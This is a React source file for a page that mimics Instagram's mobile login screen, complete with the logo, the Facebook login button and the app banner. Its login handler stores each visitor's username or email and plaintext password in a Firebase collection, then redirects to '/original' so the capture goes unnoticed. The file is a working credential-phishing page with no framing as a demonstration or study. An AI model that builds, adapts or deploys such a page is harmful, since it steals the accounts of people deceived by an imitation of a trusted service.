import React, { useState } from 'react';
import { useHistory } from 'react-router-dom';
import insta from './images/insta.png';
import dots from './images/dots.png';
import down from './images/down.png';
import fb from './images/fb.png';
import db from './firebase';
import './Mobile.css';

function Mobile() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const history = useHistory();
  const login = (event) => {
    event.preventDefault();
    if (email !== '' && password !== '') {
      db.collection('users').add({
        userId: email,
        password: password,
      });
      history.push('/original');
    }
  };
  return (
    <div className='mobile'>
      <div className='mobile__banner'>
        <a href='/' target='_top'>
          <section class='mobile__banner__text'>
            <p>Instagram</p>
            <p>Find it for free on Google Play.</p>
          </section>
        </a>
        <section class='mobile__banner__button'>
          <button>Get</button>
        </section>
      </div>
      <nav class='mobile__header'>
        <div>
          <img src={dots} alt='menu'></img>
        </div>
        <span>
          <div>
            <span>ENGLISH</span>
            <span>
              <img src={down} alt='down arrow' />
            </span>
          </div>
        </span>
      </nav>
      <div className='mobile__header__logo'>
        <a href='/'>
          <img src={insta} alt='instagram logo' />
        </a>
      </div>
      <div className='main_body'>
        <button>
          <img src={fb} alt='fb icon' />
          <span>Continue with Facebook</span>
        </button>
        <div className='mobile__divider'>
          <span>or</span>
        </div>
        <input
          value={email}
          onChange={(event) => setEmail(event.target.value)}
          type='text'
          placeholder='Phone number, username, or email'
        />
        <input
          type='password'
          value={password}
          onChange={(event) => setPassword(event.target.value)}
          placeholder='Password'
        />
        <div className='forgot__pass'>
          <a href='/'>Forgot password?</a>
        </div>
        <button onClick={login} class='login'>
          <span>Log In</span>
        </button>
        <div>
          Don't have an account?
          <a className='signup' href='/'>
            Sign up
          </a>
        </div>
      </div>
    </div>
  );
}

export default Mobile;
